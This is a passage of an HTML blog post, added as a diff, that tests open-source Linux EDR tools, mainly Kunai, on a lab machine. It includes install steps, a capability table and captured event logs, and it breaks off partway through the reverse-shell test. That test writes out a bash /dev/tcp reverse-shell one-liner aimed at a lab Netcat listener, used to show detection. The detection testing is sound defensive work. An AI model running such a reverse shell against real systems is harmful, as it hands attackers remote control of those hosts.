@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="An exploration of open‑source Linux EDRs and the kernel‑level signals that power modern threat hunting." />
+<meta name="keywords" content="mathscantor, EDR" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="dark" />
+<link rel="canonical" href="https://mathscantor.github.io/posts/linux-edr-for-host-events/" />
+
+
+    <title>
+        
+            Linux EDR for Host Events :: Mathscantor&#39;s Cybersecurity Blog  — A simple theme for Hugo
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.f6f782c824f6dd87699befc194c23b539768dd232f320940bfeb2e17f8317145.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Linux EDR for Host Events">
+  <meta itemprop="description" content="An exploration of open‑source Linux EDRs and the kernel‑level signals that power modern threat hunting.">
+  <meta itemprop="datePublished" content="2026-01-12T08:24:15+08:00">
+  <meta itemprop="dateModified" content="2026-01-12T08:24:15+08:00">
+  <meta itemprop="wordCount" content="2032">
+  <meta itemprop="image" content="https://mathscantor.github.io/posts/linux-edr-for-host-events/images/cover.png">
+  <meta itemprop="keywords" content="EDR">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://mathscantor.github.io/posts/linux-edr-for-host-events/images/cover.png">
+  <meta name="twitter:title" content="Linux EDR for Host Events">
+  <meta name="twitter:description" content="An exploration of open‑source Linux EDRs and the kernel‑level signals that power modern threat hunting.">
+
+
+
+    <meta property="og:url" content="https://mathscantor.github.io/posts/linux-edr-for-host-events/">
+  <meta property="og:site_name" content="Mathscantor&#39;s Cybersecurity Blog">
+  <meta property="og:title" content="Linux EDR for Host Events">
+  <meta property="og:description" content="An exploration of open‑source Linux EDRs and the kernel‑level signals that power modern threat hunting.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-12T08:24:15+08:00">
+    <meta property="article:modified_time" content="2026-01-12T08:24:15+08:00">
+    <meta property="article:tag" content="EDR">
+    <meta property="og:image" content="https://mathscantor.github.io/posts/linux-edr-for-host-events/images/cover.png">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-01-12 08:24:15 &#43;0800 &#43;08" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span data-pagefind-ignore class="logo__text">Be You Cat, or Mouse?</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Posts
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/tags/">
+                        Tags
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/series/">
+                        Series
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/about">
+                        About
+                    </a>
+                </li>
+            </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+
+  <main class="post">
+    
+    <link href="/posts/css/toc.css" rel="stylesheet">
+    <aside id="sticky-toc">
+      <div class="toc-title">Table of Contents</div>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-introduction">1. Introduction</a></li>
+    <li><a href="#2-kunai">2. Kunai</a>
+      <ul>
+        <li><a href="#21-installation">2.1 Installation</a></li>
+        <li><a href="#22-capabilities-overview">2.2 Capabilities Overview</a></li>
+        <li><a href="#23-testing-capabilities">2.3 Testing Capabilities</a>
+          <ul>
+            <li><a href="#231-dns-query">2.3.1 DNS Query</a></li>
+            <li><a href="#232-process-debugging">2.3.2 Process Debugging</a></li>
+            <li><a href="#233-reverse-shell">2.3.3 Reverse Shell</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#3-tracee">3. Tracee</a>
+      <ul>
+        <li><a href="#31-installation">3.1 Installation</a></li>
+        <li><a href="#32-capabilities-overview">3.2 Capabilities Overview</a></li>
+        <li><a href="#33-testing-capabilities">3.3 Testing Capabilities</a>
+          <ul>
+            <li><a href="#331-hidden-kernel-module">3.3.1 Hidden Kernel Module</a></li>
+            <li><a href="#332-syscall-hooking">3.3.2 Syscall Hooking</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#4-lkrg">4. LKRG</a>
+      <ul>
+        <li><a href="#41-installation">4.1 Installation</a></li>
+        <li><a href="#42-capabilities-overview">4.2 Capabilities Overview</a></li>
+        <li><a href="#43-testing-capabilities">4.3 Testing Capabilities</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-conclusion">5. Conclusion</a></li>
+    <li><a href="#6-references">6. References</a></li>
+  </ul>
+</nav>
+    </aside>
+    <script src="/posts/js/toc.js"></script>
+    
+    <article>
+      
+      <div class="post-thumbnail">
+          <img src="/posts/linux-edr-for-host-events/images/cover.png" alt="post image" style="display: block; margin-left: auto; margin-right: auto; max-width: 50%; max-height: 50%; margin-bottom: 1em;">
+      </div>
+      
+      <h1 class="post-title">
+        <a href="https://mathscantor.github.io/posts/linux-edr-for-host-events/">Linux EDR for Host Events</a>
+      </h1>
+      <div class="post-info">
+        <p>
+          <i class="fa-solid fa-clock"></i>
+          10 Minutes
+          <i class="fa-solid fa-clipboard"></i>
+          2032 Words
+          
+        </p>
+        <p>
+          <i class="fa-solid fa-calendar-days"></i>
+          
+            2026-01-12 08:24
+          
+  
+           
+            
+          
+        </p>
+        <p>
+        <p>
+          <i class="fa-solid fa-eye"></i>
+          <span id="stats"></span>
+<script>
+(function() {
+  var r = new XMLHttpRequest();
+  r.addEventListener('load', function() {
+    var statsEl = document.getElementById("stats");
+    if (!statsEl) return;
+
+    try {
+      var count = JSON.parse(this.responseText).count_unique;
+      console.log(count);
+      statsEl.innerText = count == 1
+        ? "1 View"
+        : count + " Views";
+    } catch (e) {
+      console.error("GoatCounter stats error:", e);
+    }
+  });
+
+  r.open('GET', 'https://mathscantor.goatcounter.com/counter/' +
+    encodeURIComponent(location.pathname.replace(/(\/)?$/, '')) + '.json');
+  r.send();
+})();
+</script>
+
+        </p>
+        
+    <p>
+        <i class="fa-solid fa-tag"></i>
+        
+
+        <span class="tag"><a href="https://mathscantor.github.io/tags/edr/">EDR</a></span>
+        
+    </p>
+
+      </br>
+        </p>
+      </div>
+      
+        <div class="post-excerpt">An exploration of open‑source Linux EDRs and the kernel‑level signals that power modern threat hunting.</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <hr>
+        
+        <h2 id="1-introduction">1. Introduction</h2>
+<p>Happy new year! To kick off the year, I’m switching gears and putting on a defender’s hat. After all, we need to &ldquo;<em>know thy enemy</em>&rdquo;. If we don’t understand how detection systems work, we’re just making blind guesses when we try to make our exploits stealthier. That’s why we are going to explore some powerful open-source tools available today.</p>
+<p>Linux Endpoint Detection and Response (EDR) focuses on collecting and correlating low-level system activity. For example, inspecting process execution, memory behavior, file access, and network events can help to surface malicious or suspicious behavior on Linux hosts. Instead of relying on signatures, Linux EDR provides the raw telemetry needed to understand what actually happened on a system.</p>
+<p>This matters because effective threat hunting depends on context. By enriching raw kernel events with process trees, execution context, and behavioral patterns, Linux EDR turns isolated signals into meaningful narratives, allowing defenders to detect stealthy attacks, investigate anomalies, and validate hypotheses rather than just reacting to alerts.</p>
+<p>In this post, we’ll look at a few open-source Linux EDR and detection projects:</p>
+<ol>
+<li>Kunai</li>
+<li>Tracee</li>
+<li>LKRG</li>
+</ol>
+<h2 id="2-kunai">2. Kunai</h2>
+<p><em>Kunai</em> is a Linux-focused detection tool that leverages eBPF probes to surface security-relevant system activity. Events collected in the kernel are passed to a user-space agent, where they are enriched, correlated, and prepared for security monitoring and threat hunting workflows.</p>
+<h3 id="21-installation">2.1 Installation</h3>
+<p>These installation instructions are meant for Ubuntu/Debian machines.</p>
+<p><u>Step 1: Installing dependencies</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt update
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt install -y clang libbpf-dev
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Assuming you have rustup and cargo installed</span>
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cargo install bpf-linker
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>Kunai</em> Dependencies<br><br></span>
+<p><u>Step 2: Build <em>Kunai</em> from source</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/kunai-project/kunai.git
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd kunai
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/kunai$ cargo xtask build --release
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Building <em>Kunai</em><br><br></span>
+<p><u>Step 3: Install <em>Kunai</em></u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/kunai$ sudo target/x86_64-unknown-linux-gnu/release/kunai install
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>Kunai</em><br><br></span>
+<p><u>Step 4: Configure <em>Kunai</em> Event Detection</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo vim /etc/kunai/config.yaml
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>events:
+</span></span><span style="display:flex;"><span>  execve:
+</span></span><span style="display:flex;"><span>    enable: true
+</span></span><span style="display:flex;"><span>  execve_script:
+</span></span><span style="display:flex;"><span>    enable: true
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Modify <em>Kunai</em> Configuration<br><br></span>
+<h3 id="22-capabilities-overview">2.2 Capabilities Overview</h3>
+<p>The capabilities of <em>Kunai</em> are summarized in the following table:</p>
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center;">Category</th>
+      <th style="text-align: center;">Capability</th>
+      <th style="text-align: center;">What It Observes / Detects</th>
+      <th style="text-align: center;">Why It Matters</th>
+    </tr>
+  <thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left;"><strong>Process Lifecycle</strong></td>
+      <td style="text-align: left;">Execve</td>
+      <td style="text-align: left;">Binary execution</td>
+      <td style="text-align: left;">Core signal for initial access and malware execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Execve Script</td>
+      <td style="text-align: left;">Script-based execution (bash, python, etc.)</td>
+      <td style="text-align: left;">Catches LOLBins and script-based tradecraft</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Exit</td>
+      <td style="text-align: left;">Process termination</td>
+      <td style="text-align: left;">Tracks short-lived or crashing processes</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Exit Group</td>
+      <td style="text-align: left;">Thread group termination</td>
+      <td style="text-align: left;">Useful for multi-threaded malware</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Clone</td>
+      <td style="text-align: left;">Process / thread creation</td>
+      <td style="text-align: left;">Detects forks, daemonization, process trees</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Process Control &amp; Abuse</strong></td>
+      <td style="text-align: left;">Prctl</td>
+      <td style="text-align: left;">Process attribute changes</td>
+      <td style="text-align: left;">Often abused for stealth or anti-debugging</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Kill</td>
+      <td style="text-align: left;">Signal delivery</td>
+      <td style="text-align: left;">Process termination, lateral interference</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Ptrace</td>
+      <td style="text-align: left;">Debugger attachment</td>
+      <td style="text-align: left;">Strong signal for malware, injectors, debuggers</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Kernel &amp; Privilege Abuse</strong></td>
+      <td style="text-align: left;">Init Module</td>
+      <td style="text-align: left;">Kernel module loading</td>
+      <td style="text-align: left;">Rootkits and kernel persistence</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">BPF Prog Load</td>
+      <td style="text-align: left;">eBPF program loading</td>
+      <td style="text-align: left;">Detects BPF-based malware or stealth tooling</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">BPF Socket Filter Attached</td>
+      <td style="text-align: left;">BPF network filter attachment</td>
+      <td style="text-align: left;">Network traffic interception</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Memory Execution</strong></td>
+      <td style="text-align: left;">Mprotect Exec</td>
+      <td style="text-align: left;">RW → RX memory transitions</td>
+      <td style="text-align: left;">Shellcode and in-memory execution</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Mmap Exec</td>
+      <td style="text-align: left;">Executable memory mappings</td>
+      <td style="text-align: left;">Fileless and reflective payloads</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Network Activity</strong></td>
+      <td style="text-align: left;">Connect</td>
+      <td style="text-align: left;">Outbound network connections</td>
+      <td style="text-align: left;">C2, lateral movement</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">DNS Query</td>
+      <td style="text-align: left;">DNS resolution events</td>
+      <td style="text-align: left;">Domain-based beaconing</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Send Data</td>
+      <td style="text-align: left;">Data exfiltration</td>
+      <td style="text-align: left;">C2 traffic and leaks</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>File Read Operations</strong></td>
+      <td style="text-align: left;">Read</td>
+      <td style="text-align: left;">Generic file reads</td>
+      <td style="text-align: left;">Recon and credential access</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Read Config</td>
+      <td style="text-align: left;">Configuration file reads</td>
+      <td style="text-align: left;">Targeting system/app configs</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>File Write Operations</strong></td>
+      <td style="text-align: left;">Write</td>
+      <td style="text-align: left;">Generic file writes</td>
+      <td style="text-align: left;">Droppers and modifications</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Write Config</td>
+      <td style="text-align: left;">Config file modification</td>
+      <td style="text-align: left;">Persistence and tampering</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Write and Close</td>
+      <td style="text-align: left;">Atomic write behavior</td>
+      <td style="text-align: left;">Common malware pattern</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Filesystem Changes</strong></td>
+      <td style="text-align: left;">File Create</td>
+      <td style="text-align: left;">New file creation</td>
+      <td style="text-align: left;">Droppers, payload staging</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">File Rename</td>
+      <td style="text-align: left;">File movement</td>
+      <td style="text-align: left;">Masquerading and evasion</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">File Unlink</td>
+      <td style="text-align: left;">File deletion</td>
+      <td style="text-align: left;">Cleanup and anti-forensics</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">File Scan</td>
+      <td style="text-align: left;">Directory/file enumeration</td>
+      <td style="text-align: left;">Reconnaissance phase</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Async / Advanced I/O</strong></td>
+      <td style="text-align: left;">IO_uring SQE</td>
+      <td style="text-align: left;">io_uring submission events</td>
+      <td style="text-align: left;">Modern high-performance malware</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"><strong>Telemetry &amp; Stability</strong></td>
+      <td style="text-align: left;">Error</td>
+      <td style="text-align: left;">Internal sensor errors</td>
+      <td style="text-align: left;">Sensor health visibility</td>
+    </tr>
+    <tr>
+      <td style="text-align: left;"></td>
+      <td style="text-align: left;">Event Loss</td>
+      <td style="text-align: left;">Dropped events</td>
+      <td style="text-align: left;">Detection blind spots</td>
+    </tr>
+  </tbody>
+</table>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="table"><em>Kunai</em> Capability Coverage<br><br></span>
+<h3 id="23-testing-capabilities">2.3 Testing Capabilities</h3>
+<p>Is Kunai really as good as its documentation describes it to be? Let&rsquo;s find out!</p>
+<h4 id="231-dns-query">2.3.1 DNS Query</h4>
+<p>This example demonstrates a simple DNS query to resolve the IP address for <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;google.com&ensp;</span>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ nslookup google.com
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">DNS Query Example Command<br><br></span>
+<p>As seen from the listing below, <em>Kunai</em> captures a <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;dns_query&ensp;</span> event corresponding to a domain resolution request for <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;google.com&ensp;</span>. The event records the process responsible for the lookup (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;systemd-resolved&ensp;</span>), its execution context, and the full set of IP addresses returned in the DNS response.</p>
+<p>By preserving both the queried domain and the resolved endpoints, <em>Kunai</em> provides visibility into name resolution activity that often precedes outbound connections.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ancestors&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;command_line&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd-resolved&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;exe&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd-resolved&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;query&#34;</span>: <span style="color:#e6db74">&#34;google.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;response&#34;</span>: <span style="color:#e6db74">&#34;74.125.130.139;74.125.130.138;74.125.130.101;74.125.130.113;74.125.130.100;74.125.130.102&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;info&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;event&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;source&#34;</span>: <span style="color:#e6db74">&#34;kunai&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">61</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;dns_query&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;uuid&#34;</span>: <span style="color:#e6db74">&#34;97d8ceb6-e1a1-34c6-56f4-dc20f9b9577d&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;batch&#34;</span>: <span style="color:#ae81ff">2125</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;utc_time&#34;</span>: <span style="color:#e6db74">&#34;2026-01-18T02:51:45.117865484Z&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">DNS Query Example Output<br><br></span>
+<h4 id="232-process-debugging">2.3.2 Process Debugging</h4>
+<p>This example demonstrates a debugger attaching to a running process using the <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ptrace()&ensp;</span> syscall. Debugger attachment is a high-signal event, often associated with reverse engineering, process inspection, or malicious code injection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo gdb -p <span style="color:#e6db74">`</span>pidof sleep<span style="color:#e6db74">`</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Process Debugging Example Command<br><br></span>
+<p>Kunai captures a <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ptrace&ensp;</span> event where <em>GDB</em> attaches to an existing <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;sleep&ensp;</span> process. The event records the full process ancestry leading up to the debugger invocation, the exact command used (<code>gdb -p 6967</code>), and both the source executable (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/usr/bin/gdb&ensp;</span>) and the target process being traced (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/usr/bin/sleep&ensp;</span>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ancestors&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd|/usr/lib/systemd/systemd|/usr/bin/python3.12|/usr/bin/bash|/usr/bin/sudo|/usr/bin/sudo&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;command_line&#34;</span>: <span style="color:#e6db74">&#34;gdb -p 6967&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;exe&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/usr/bin/gdb&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;mode&#34;</span>: <span style="color:#e6db74">&#34;0xa&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;target&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;command_line&#34;</span>: <span style="color:#e6db74">&#34;sleep 10&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;exe&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/usr/bin/sleep&#34;</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;info&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;event&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;source&#34;</span>: <span style="color:#e6db74">&#34;kunai&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">9</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;ptrace&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;uuid&#34;</span>: <span style="color:#e6db74">&#34;547ae482-37cf-b3b7-03be-076edc0f3f9b&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;batch&#34;</span>: <span style="color:#ae81ff">1477</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;utc_time&#34;</span>: <span style="color:#e6db74">&#34;2026-01-18T03:10:23.330899923Z&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Process Debugging Example Output<br><br></span>
+<h4 id="233-reverse-shell">2.3.3 Reverse Shell</h4>
+<p>This example demonstrates a simple reverse shell payload that connects out to our <em>Netcat</em> listener at <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;172.16.205.1:4242.&ensp;</span></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ /bin/bash -l &gt; /dev/tcp/172.16.205.1/4242 0&lt;&amp;<span style="color:#ae81ff">1</span> 2&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Reverse Shell Example Command<br><br></span>
+<p>As shown in the listing below, <em>Kunai</em> captures a connect event initiated by <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/bin/bash&ensp;</span>, revealing an outbound TCP connection to the <em>Netcat</em> listener at <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;172.16.205.1:4242.&ensp;</span> The event records the full process ancestry leading to the shell execution, the executable responsible for the connection, and detailed socket metadata, including protocol, source port, and destination address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
